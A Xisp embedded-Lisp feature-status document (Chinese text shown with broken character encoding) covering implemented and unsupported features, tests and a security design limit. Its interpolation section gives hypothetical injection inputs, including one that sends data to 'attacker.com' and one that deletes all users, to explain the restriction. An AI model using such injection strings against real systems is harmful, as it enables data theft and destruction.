# Xisp æ–‡æ¡£ç¤ºä¾‹ä¸­ä¸æ”¯æŒçš„åŠŸèƒ½æ¸…å•

**ç”Ÿæˆæ—¶é—´**: 2026-01-27
**æœ€åæ›´æ–°**: 2026-01-27
**æµ‹è¯•çŠ¶æ€**: å·²éªŒè¯

---

## âœ… å·²å®ç°çš„åŠŸèƒ½ï¼ˆ5ä¸ªï¼‰

### 1. å®/å‡½æ•°çš„å¯å˜å‚æ•°

**çŠ¶æ€**: âœ… å·²å®ç°ï¼ˆ2026-01-27ï¼‰

**ä¼˜å…ˆçº§**: ğŸ”´ é«˜

**å·²å®ç°**:
- âœ… Common Lisp é£æ ¼ï¼š`(x y . rest)`
- âœ… Scheme é£æ ¼ï¼š`(x y &rest rest)`
- âœ… çº¯å¯å˜å‚æ•°ï¼š`(. all)` æˆ– `(&rest all)`
- âœ… ç©ºå¯å˜å‚æ•°ï¼š`(x . rest)` å½“åªä¼ å…¥ x æ—¶ï¼Œrest ä¸º nil

**å®ç°ä½ç½®**:
- è§£æå™¨ï¼š`src/parser/parser.cj` - `parseRestParameter`
- å‚æ•°æå–ï¼š`src/core/eval_helpers.cj` - `extractSymbols`
- å‚æ•°ç»‘å®šï¼š`src/core/eval_higher_order.cj` - `applyProcedure`

**å•å…ƒæµ‹è¯•**: `src/modern_test.cj`
- `testRestParameters` - æµ‹è¯•å¯å˜å‚æ•°
- `testOnlyRestParameter` - æµ‹è¯•çº¯å¯å˜å‚æ•°

**é›†æˆæµ‹è¯•**: `lisp-tests/rest_params_test.lisp`

**ä½¿ç”¨ç¤ºä¾‹**:
```lisp
; Common Lisp é£æ ¼
(define test-lambda
  (lambda (x y . rest)
    (list 'x=x x 'y=y 'rest=rest rest)))
(test-lambda 1 2 3 4 5)
; => (x=x 1 y=y 2 rest=rest (3 4 5))

; Scheme é£æ ¼
(define test-scheme
  (lambda (x y &rest rest)
    (list x y rest)))
(test-scheme 1 2 3 4)
; => (1 2 (3 4))

; çº¯å¯å˜å‚æ•°
(define test-all
  (lambda (. all)
    all))
(test-all 'a 'b 'c)
; => (a b c)

; ç©ºå¯å˜å‚æ•°
(test-lambda 1)
; => (x=x 1 y=y nil rest=rest nil)
```

---

### 2. ,@ (comma-at) æ‹¼æ¥

**çŠ¶æ€**: âœ… å·²å®ç°ï¼ˆ2026-01-27ï¼‰

**ä¼˜å…ˆçº§**: ğŸ”´ é«˜

**å·²å®ç°**:
- âœ… ä¸­é—´æ‹¼æ¥ï¼š`` `(x y z ,@lst) ``
- âœ… å¼€å¤´æ‹¼æ¥ï¼š`` `(,@lst) ``
- âœ… å¤šä¸ªæ‹¼æ¥ï¼š`` `(,@lst1 ,@lst2) ``
- âœ… æ··åˆæ‹¼æ¥ï¼š`` `(1 2 ,@lst 4 5) ``

**å®ç°ä½ç½®**:
- æ ¸å¿ƒé€»è¾‘ï¼š`src/core/eval_special_forms.cj` - `expandBackquote`

**å•å…ƒæµ‹è¯•**: `src/modern_test.cj` - `testCommaAtSplice`

**é›†æˆæµ‹è¯•**: `lisp-tests/rest_params_test.lisp`

**ä½¿ç”¨ç¤ºä¾‹**:
```lisp
(define lst1 '(a b c))
(define lst2 '(1 2 3))

; ä¸­é—´æ‹¼æ¥
`(x y z ,@lst1)
; => (x y z a b c)

; å¼€å¤´æ‹¼æ¥
`(,@lst2)
; => (1 2 3)

; å¤šä¸ªæ‹¼æ¥
`(,@lst1 ,@lst2)
; => (a b c 1 2 3)

; æ··åˆæ‹¼æ¥
`(1 2 ,@lst1 4 5)
; => (1 2 a b c 4 5)
```

---

### 3. eval ç‰¹æ®Šå½¢å¼

**çŠ¶æ€**: âœ… å·²å®ç°ï¼ˆ2026-01-27ï¼‰

**ä¼˜å…ˆçº§**: ğŸ”´ é«˜

**å·²å®ç°**:
- âœ… eval æ•´æ•°
- âœ… eval ç¬¦å·
- âœ… eval quoted list
- âœ… eval åŠ¨æ€æ„é€ çš„è¡¨è¾¾å¼
- âœ… eval åµŒå¥—è°ƒç”¨
- âœ… eval å­—ç¬¦ä¸²ã€nil ç­‰åŸºæœ¬ç±»å‹

**å®ç°ä½ç½®**: `src/core/eval_higher_order.cj` - `evalEval`

**å•å…ƒæµ‹è¯•**: `src/modern_test.cj` - `testEval`

**ä½¿ç”¨ç¤ºä¾‹**:
```lisp
; eval æ•´æ•°
(eval 42)
; => 42

; eval ç¬¦å·
(define x 100)
(eval (quote x))
; => 100

; eval quoted list - åŠ¨æ€æ‰§è¡Œ lambda
(eval (quote ((lambda (x y) (+ x y)) 10 20)))
; => 30

; eval åŠ¨æ€æ„é€ çš„è¡¨è¾¾å¼
(define code (quote (+ 1 2 3)))
(eval code)
; => 6

; eval åµŒå¥—è°ƒç”¨
(eval (list (quote +) 5 10))
; => 15
```

---

### 4. ç¬¦å·/å…³é”®å­—æ¯”è¾ƒ

**çŠ¶æ€**: âœ… å·²å®ç°ï¼ˆ2026-01-27ï¼‰

**ä¼˜å…ˆçº§**: ğŸ”´ é«˜

**å·²å®ç°**: `eq?` - ç›¸ç­‰æ€§æ¯”è¾ƒï¼ˆæ”¯æŒç¬¦å·ã€å­—ç¬¦ä¸²ã€æ•´æ•°ã€å¸ƒå°”å€¼ã€nilï¼‰

**å®ç°ä½ç½®**: `src/core/builtin_logic.cj`

**æµ‹è¯•æ–‡ä»¶**: `lisp-tests/equality_test.lisp`

---

### 5. å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°

**çŠ¶æ€**: âœ… å·²å®ç°ï¼ˆ2026-01-27ï¼‰

**ä¼˜å…ˆçº§**: ğŸ”´ é«˜

**å·²å®ç°**:
- `string=?` - å­—ç¬¦ä¸²ç›¸ç­‰æ¯”è¾ƒ
- `string<` - å­—ç¬¦ä¸²å°äºæ¯”è¾ƒ
- `string>` - å­—ç¬¦ä¸²å¤§äºæ¯”è¾ƒ

**å®ç°ä½ç½®**: `src/core/builtin_print.cj`

**æµ‹è¯•æ–‡ä»¶**: `lisp-tests/equality_test.lisp`

---

## âŒ ç¡®è®¤ä¸æ”¯æŒçš„åŠŸèƒ½ï¼ˆ3ä¸ªï¼‰

### 1. å“ˆå¸Œæ˜ å°„è§£æ„

**ä¼˜å…ˆçº§**: ğŸŸ¡ ä¸­

**é—®é¢˜**:
```lisp
;; âŒ ä¸å·¥ä½œ
(let [[{:host h :port p}] [{:host "localhost" :port 8080}]])
;; h â†’ nil, p â†’ nil (åº”è¯¥æ˜¯ "localhost" å’Œ 8080)
```

**å½±å“èŒƒå›´**:
- é…ç½®è§£æç¤ºä¾‹
- ä»»ä½•éœ€è¦è§£æ„å“ˆå¸Œæ˜ å°„çš„åœºæ™¯

**å½“å‰è§£å†³æ–¹æ¡ˆ**:
```lisp
;; âœ… ä½¿ç”¨ hget
(let ((config {:host "localhost" :port 8080})
      (h (hget config :host))
      (p (hget config :port)))
  ...)
```

**å»ºè®®**: éœ€è¦æ‰©å±• `src/core/eval_let.cj` ä¸­çš„è§£æ„é€»è¾‘

---

### 2. match å“ˆå¸Œæ˜ å°„æ¨¡å¼

**ä¼˜å…ˆçº§**: ğŸŸ¡ ä¸­

**é—®é¢˜**:
```lisp
;; âŒ ä¸å·¥ä½œ
(match {:name "Alice" :age 30}
  [{:name n :age a} (println n a)])
;; æ²¡æœ‰è¾“å‡ºï¼ŒåŒ¹é…å¤±è´¥
```

**å½±å“èŒƒå›´**:
- ç°ä»£è¯­æ³•æ–‡æ¡£ä¸­çš„ç¤ºä¾‹
- ä½¿ç”¨å“ˆå¸Œæ˜ å°„ä½œä¸ºæ•°æ®ç»“æ„çš„åœºæ™¯

**å»ºè®®**: éœ€è¦æ‰©å±• `src/core/eval_match.cj` æ”¯æŒ HashMap æ¨¡å¼

---

### 3. match å®ˆå«æ¡ä»¶å¤šè¡Œæ ¼å¼

**ä¼˜å…ˆçº§**: ğŸŸ¡ ä¸­

**é—®é¢˜**:
```lisp
;; âŒ å¤šè¡Œå®ˆå«æ¡ä»¶è¿”å› nil
(match 15
  (x when (> x 10)) (str "large: " x)
  (x when (< x 5)) (str "small: " x)
  _ "medium")
; => nil (é”™è¯¯)

;; âœ… å•è¡Œå®ˆå«æ¡ä»¶å¯ä»¥å·¥ä½œ
(match 15 (x when (> x 10)) (str "large: " x) (x when (< x 10)) (str "small: " x)) _ "medium")
; => "large: 15"
```

**å½±å“èŒƒå›´**:
- æ–‡æ¡£ä¸­çš„å®ˆå«æ¡ä»¶ç¤ºä¾‹
- éœ€è¦å¤æ‚å®ˆå«æ¡ä»¶çš„ä¸šåŠ¡é€»è¾‘

**æµ‹è¯•ç»“æœ**:
- âœ… å¤šè¡Œå¸¸é‡åŒ¹é…ï¼šå·¥ä½œæ­£å¸¸
- âœ… å¤šè¡Œåˆ—è¡¨è§£æ„ï¼šå·¥ä½œæ­£å¸¸
- âœ… å¤šè¡Œå‘é‡åŒ¹é…ï¼šå·¥ä½œæ­£å¸¸
- âŒ å¤šè¡Œå®ˆå«æ¡ä»¶ï¼šè¿”å› nil
- âœ… å•è¡Œå®ˆå«æ¡ä»¶ï¼šå·¥ä½œæ­£å¸¸

**ä¸´æ—¶è§£å†³æ–¹æ¡ˆ**:
```lisp
;; ä½¿ç”¨å•è¡Œæ ¼å¼
(match 15 (x when (> x 10)) (str "large: " x) (x when (< x 10)) (str "small: " x)) _ "medium")

;; æˆ–è€…ä½¿ç”¨åµŒå¥— if ä»£æ›¿
(if (> x 10)
    (str "large: " x)
    (if (< x 5)
        (str "small: " x)
        "medium"))
```

**å»ºè®®**: éœ€è¦ä¿®å¤ `src/parser/parser.cj` æˆ– `src/core/eval_match.cj` ä¸­çš„å®ˆå«æ¡ä»¶è§£æé€»è¾‘

---

## ğŸ”’ è®¾è®¡é™åˆ¶ï¼ˆå‡ºäºå®‰å…¨æˆ–è®¾è®¡è€ƒè™‘ä¸æ”¯æŒï¼‰

### å­—ç¬¦ä¸²æ’å€¼ä¸­çš„å‡½æ•°è°ƒç”¨

**çŠ¶æ€**: âš« è®¾è®¡é™åˆ¶ - ä¸æ”¯æŒï¼ˆå‡ºäºå®‰å…¨è€ƒè™‘ï¼‰

**åŸå› **:
- Xisp æ˜¯åµŒå…¥å¼è„šæœ¬è¯­è¨€ï¼Œå­—ç¬¦ä¸²å¯èƒ½æ¥è‡ªä¸å¯ä¿¡æ¥æºï¼ˆå‰ç«¯ç”¨æˆ·è¾“å…¥ã€é…ç½®æ–‡ä»¶ã€å¤–éƒ¨APIç­‰ï¼‰
- æ”¯æŒå‡½æ•°è°ƒç”¨ä¼šå¯¼è‡´ä»£ç æ³¨å…¥é£é™©
- å½“å‰è®¾è®¡åªæ”¯æŒå®‰å…¨çš„ã€æ— å‰¯ä½œç”¨çš„è¡¨è¾¾å¼

**åªæ”¯æŒ**:
- ç®€å•å˜é‡: `#"Name: #{name}"` âœ…
- ç®€å•è¡¨è¾¾å¼: `#"Sum: #{+ x y}"` âœ…
- å­—ç¬¦ä¸²æ‹¼æ¥: `#"Path: #{base}/file.txt"` âœ…

**æ˜ç¡®ä¸æ”¯æŒ**:
- å‡½æ•°è°ƒç”¨: `#{(func arg)}` âŒ
- ç‰¹æ®Šå½¢å¼: `#{(if condition a b)}` âŒ
- ä»»æ„ä»£ç æ‰§è¡Œ: `#{(eval code)}` âŒ

**å®‰å…¨é£é™©ç¤ºä¾‹**ï¼ˆå¦‚æœæ”¯æŒï¼‰:
```lisp
;; é£é™© 1: ç”¨æˆ·è¾“å…¥æ³¨å…¥
(let [username "#{(delete-all-users)}"]
  (println #"Welcome, #{username}!"))
;; å¦‚æœæ”¯æŒå‡½æ•°è°ƒç”¨ï¼Œå°±ä¼šæ‰§è¡Œå±é™©æ“ä½œ

;; é£é™© 2: é…ç½®æ–‡ä»¶æ³¨å…¥
;; é…ç½®æ–‡ä»¶å†…å®¹: "Welcome #{(eval '(load \"malicious.lisp\"))}"
(println (read-config-string))
;; ä¼šæ‰§è¡Œæ¶æ„ä»£ç 

;; é£é™© 3: æ—¥å¿—æ³¨å…¥
(println #"User input: #{user-input}")
;; å¦‚æœ user-input = "#{(send-data 'http://attacker.com' data)}"
;; ä¼šæ³„éœ²æ•°æ®
```

**æ›¿ä»£æ–¹æ¡ˆ**:
```lisp
;; æ–¹æ¡ˆ 1: ä½¿ç”¨ str å‡½æ•°æ‹¼æ¥
(str "Result: " (hget m :name))

;; æ–¹æ¡ˆ 2: ä½¿ç”¨ println å¤šå‚æ•°
(println "Result:" (hget m :name))

;; æ–¹æ¡ˆ 3: å…ˆæ±‚å€¼å†æ’å€¼
(let [result (hget m :name)]
  (println #"Value: #{result}"))
```

**ä¸å…¶ä»–è¯­è¨€å¯¹æ¯”**:

| è¯­è¨€ | å­—ç¬¦ä¸²æ’å€¼ | ç¼–è¯‘æ—¶vsè¿è¡Œæ—¶ | å®‰å…¨æ€§ |
|------|-----------|---------------|--------|
| **Python** | `f"{func(arg)}"` | ç¼–è¯‘æ—¶ç¡®å®š | ç›¸å¯¹å®‰å…¨ |
| **JavaScript** | `` `${func(arg)}` `` | ç¼–è¯‘æ—¶ç¡®å®š | ç›¸å¯¹å®‰å…¨ |
| **Xisp** | `#{var}` `#{+ x y}` | è¿è¡Œæ—¶è§£æ | **éœ€è¦é™åˆ¶** |

**å…³é”®åŒºåˆ«**ï¼š
- Python/JS çš„å­—ç¬¦ä¸²æ’å€¼æ˜¯**ç¼–è¯‘æ—¶è¯­æ³•**ï¼Œä»£ç åœ¨æºç ä¸­å·²ç»ç¡®å®š
- Xisp çš„å­—ç¬¦ä¸²æ’å€¼æ˜¯**è¿è¡Œæ—¶è§£æ**çš„ï¼Œå­—ç¬¦ä¸²å¯èƒ½æ¥è‡ªå¤–éƒ¨è¾“å…¥
- å› æ­¤ Xisp å¿…é¡»é™åˆ¶å­—ç¬¦ä¸²æ’å€¼çš„åŠŸèƒ½ï¼Œç¡®ä¿å®‰å…¨

**è®¾è®¡ä¼˜åŠ¿**:
1. **å®‰å…¨æ€§**: é˜²æ­¢ä»£ç æ³¨å…¥
2. **ç®€æ´æ€§**: ä¿æŒè¯­è¨€ç®€å•
3. **å¯é¢„æµ‹æ€§**: å­—ç¬¦ä¸²æ’å€¼çš„è¡Œä¸ºæ¸…æ™°
4. **æ€§èƒ½**: ä¸éœ€è¦åœ¨æ’å€¼ä¸­å¤„ç†å¤æ‚çš„å‡½æ•°è°ƒç”¨

---

## âœ… ç¡®è®¤æ”¯æŒçš„åŠŸèƒ½

1. âœ… ç®€å•å‘é‡è§£æ„: `let [[x y] [1 2]]`
2. âœ… å‘é‡è§£æ„ with &: `let [[x y & rest] [1 2 3 4 5]]`
3. âœ… åµŒå¥—å‘é‡è§£æ„: `let [[[a b] c] [[1 2] 3]]`
4. âœ… match ç¬¦å·åŒ¹é…: `match :admin :admin "Administrator"`
5. âœ… match å¤šè¡Œå¸¸é‡åŒ¹é…ã€åˆ—è¡¨è§£æ„ã€å‘é‡åŒ¹é…ï¼ˆé™¤å®ˆå«æ¡ä»¶å¤–ï¼‰

---

## å®ç°ä¼˜å…ˆçº§å»ºè®®

### âœ… å·²å®Œæˆé«˜ä¼˜å…ˆçº§åŠŸèƒ½ï¼ˆ5ä¸ªï¼‰

1. âœ… **ç¬¦å·/å…³é”®å­—æ¯”è¾ƒ** (`eq?`) - 2026-01-27 å®Œæˆ
2. âœ… **å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°** (`string=?`, `string<`, `string>`) - 2026-01-27 å®Œæˆ
3. âœ… **å®/å‡½æ•°çš„å¯å˜å‚æ•°** - 2026-01-27 å®Œæˆ
4. âœ… **,@ (comma-at) æ‹¼æ¥** - 2026-01-27 å®Œæˆ
5. âœ… **eval ç‰¹æ®Šå½¢å¼** - 2026-01-27 å®Œæˆ

### ğŸŸ¡ ä¸­ä¼˜å…ˆçº§ï¼ˆå¢å¼ºè¯­æ³•ç‰¹æ€§ï¼‰

6. **match å“ˆå¸Œæ˜ å°„åŒ¹é…** (å»ºè®®ä¸‹ä¸€ä¸ªå®ç°)
   - åŸå› ï¼šæå‡ match çš„å®ç”¨æ€§
   - å®ç°éš¾åº¦ï¼šä¸­
   - æ–‡ä»¶ï¼š`src/core/eval_match.cj`

7. **å“ˆå¸Œæ˜ å°„è§£æ„**
   - åŸå› ï¼šè®©ä»£ç æ›´ç®€æ´
   - å®ç°éš¾åº¦ï¼šä¸­
   - æ–‡ä»¶ï¼š`src/core/eval_let.cj`

8. **match å®ˆå«æ¡ä»¶å¤šè¡Œæ ¼å¼**
   - åŸå› ï¼šæœ‰å•è¡Œæ›¿ä»£æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨åµŒå¥— if
   - å®ç°éš¾åº¦ï¼šä¸­
   - æ–‡ä»¶ï¼š`src/parser/parser.cj` æˆ– `src/core/eval_match.cj`

### âš« è®¾è®¡é™åˆ¶ï¼ˆä¸å®ç°ï¼‰

9. **å­—ç¬¦ä¸²æ’å€¼ä¸­çš„å‡½æ•°è°ƒç”¨**
   - åŸå› ï¼š**å®‰å…¨è€ƒè™‘**ï¼Œé˜²æ­¢ä»£ç æ³¨å…¥
   - çŠ¶æ€ï¼šè®¾è®¡é™åˆ¶ï¼Œæ°¸ä¹…ä¸æ”¯æŒ
   - è¯¦è§ï¼š[è®¾è®¡é™åˆ¶](#-è®¾è®¡é™åˆ¶å‡ºäºå®‰å…¨æˆ–è®¾è®¡è€ƒè™‘ä¸æ”¯æŒ) ç« èŠ‚

---

## æµ‹è¯•å‘½ä»¤

```bash
# è¿è¡Œå®Œæ•´æµ‹è¯•
cjpm test

# è¿è¡Œç‰¹å®šæµ‹è¯•
cjpm test --show-all-output --filter 'ModernTest.testRestParameters'
cjpm test --show-all-output --filter 'ModernTest.testCommaAtSplice'
cjpm test --show-all-output --filter 'ModernTest.testEval'

# è¿è¡Œ Lisp é›†æˆæµ‹è¯•
./target/release/bin/ystyle::xisp.cli lisp-tests/rest_params_test.lisp
./target/release/bin/ystyle::xisp.cli lisp-tests/equality_test.lisp
```

---

## ä¸‹ä¸€æ­¥è¡ŒåŠ¨

1. âœ… æ–‡æ¡£å·²ä¿®æ­£ä¸ºä½¿ç”¨æ”¯æŒçš„è¯­æ³•
2. âœ… å·²å®ç°ï¼šé«˜ä¼˜å…ˆçº§åŠŸèƒ½ï¼ˆeq?ã€string=?ã€string<ã€string>ã€å¯å˜å‚æ•°ã€,@ æ‹¼æ¥ã€evalï¼‰
3. âœ… æ‰€æœ‰åŠŸèƒ½éƒ½æœ‰å®Œæ•´çš„å•å…ƒæµ‹è¯•å’Œé›†æˆæµ‹è¯•
4. âœ… å­—ç¬¦ä¸²æ’å€¼å‡½æ•°è°ƒç”¨å·²æ ‡è®°ä¸ºè®¾è®¡é™åˆ¶ï¼ˆå®‰å…¨è€ƒè™‘ï¼‰
5. ğŸ“ è€ƒè™‘ï¼šä¸­ä¼˜å…ˆçº§åŠŸèƒ½çš„å®ç°è®¡åˆ’

**æœ€åæ›´æ–°**: 2026-01-27
**æµ‹è¯•è¦†ç›–ç‡**: 207 ä¸ªå•å…ƒæµ‹è¯•å…¨éƒ¨é€šè¿‡
**ä¸æ”¯æŒåŠŸèƒ½**: 3 ä¸ªï¼ˆä¸­ä¼˜å…ˆçº§ï¼‰
**è®¾è®¡é™åˆ¶**: 1 ä¸ªï¼ˆå­—ç¬¦ä¸²æ’å€¼å‡½æ•°è°ƒç”¨ - æ°¸ä¹…ä¸æ”¯æŒï¼‰
